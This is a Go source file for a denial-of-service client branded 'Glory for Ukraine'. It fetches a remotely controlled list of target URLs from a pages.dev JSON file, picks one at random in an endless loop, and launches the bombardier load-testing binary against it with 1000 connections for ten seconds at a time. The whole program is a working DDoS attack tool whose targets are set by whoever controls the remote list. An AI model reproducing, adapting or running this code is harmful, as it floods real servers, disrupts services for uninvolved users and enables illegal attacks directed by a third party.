package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"math/rand"
	"time"
	"runtime"
	"path"
	"os"
	"os/exec"
	"syscall"
)

func loadConfigs(url string) ([]string, error) {
	httpClient := http.Client {
		Timeout: time.Second * 1,
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return []string{}, err
	}

	res, err := httpClient.Do(req)
	if err != nil {
		return []string{}, err
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return []string{}, err
	}

	var configs []string
	err = json.Unmarshal(body, &configs)
	if err != nil {
		return []string{}, err
	}

	return configs, nil
}

func randomItem(items []string) string {
	randomIndex := rand.Intn(len(items))
    return items[randomIndex]
}

func bombardierExecutable() string {
	currentFolder, err := os.Getwd()
	if err != nil {
        log.Fatal(err)
    }

	var result string = ""
    switch runtime.GOOS {
    case "windows":
        result = path.Join(currentFolder, "bin", "win", "bombardier.exe")
    case "darwin":
        result = path.Join(currentFolder, "bin", "mac", "bombardier")
    case "linux":
        result = path.Join(currentFolder, "bin", "linux", "bombardier")
    default:
        log.Fatal("Unsupported OS: ", runtime.GOOS)
    }

	return result
}

func launchWithTimeout(timeout time.Duration, binary string, arguments ...string) error {
	cmd := exec.Command(binary, arguments...)

	cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr

	// This sets up a process group which we kill later.
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	if err := cmd.Start(); err != nil {
		return err
	}

	// buffered chan is important so the goroutine does't
	// get blocked and stick around if the function returns
	// after the timeout
	done := make(chan error, 1)

	go func() {
		done <- cmd.Wait()
	}()

	select {
	case err := <-done:
		// this will be nil if no error
		return err
	case <-time.After(timeout):
		// We created a process group above which we kill here.
		pgid, err := syscall.Getpgid(cmd.Process.Pid)
		if err != nil {
			return err
		}
		// note the minus sign
		if err := syscall.Kill(-pgid, 15); err != nil {
			return err
		}
		return fmt.Errorf("Timeout")
	}
}

func main() {
	fmt.Println(string("\033[33m"), `
██████████████████████████████
██████████████░░██████████████
████░████████░░░░████████░████
████░░░██████░░░░██████░░░████
████░█░░░█████░░██████░░█░████
████░██░░█████░░█████░░██░████
████░███░░████░░████░░███░████
████░███░░████░░████░░███░████
████░███░░████░░████░░███░████
████░████░░███░░███░░████░████
████░████░░███░░███░░████░████
████░██░░░███░░░░███░░░██░████
████░██░░███░░██░░███░░██░████
████░██░░░██████████░░░██░████
████░████░░░░░██░░░░░████░████
████░█████░░██░░██░░█████░████
████░░░░░░░░░░░░░░░░░░░░░░████
██████████░░██░░██░░██████████
 ██████████░░█░░█░░██████████
  ██████████░░░░░░██████████
    █████████░░░░█████████
      ██████████████
             ████`,
string("\033[1;33m"),
"\n\nGlory for Ukraine\n",
string("\033[0m"))

	rand.Seed(time.Now().UnixNano())

	var cachedConfigs []string
	for {
		configs, err := loadConfigs("https://gloryforukraine.pages.dev/targets.json")
		if err != nil {
			log.Println(err)
			if len(cachedConfigs) == 0 {
				time.Sleep(2 * time.Second)
				continue
			}
		} else {
			cachedConfigs = configs
		}

		// ensure process timeout is equal to requested timeout from tool
		err = launchWithTimeout(time.Second * 10, bombardierExecutable(), randomItem(cachedConfigs), "--connections=1000")
		if err != nil {
			fmt.Println(err)
		}
	}
}
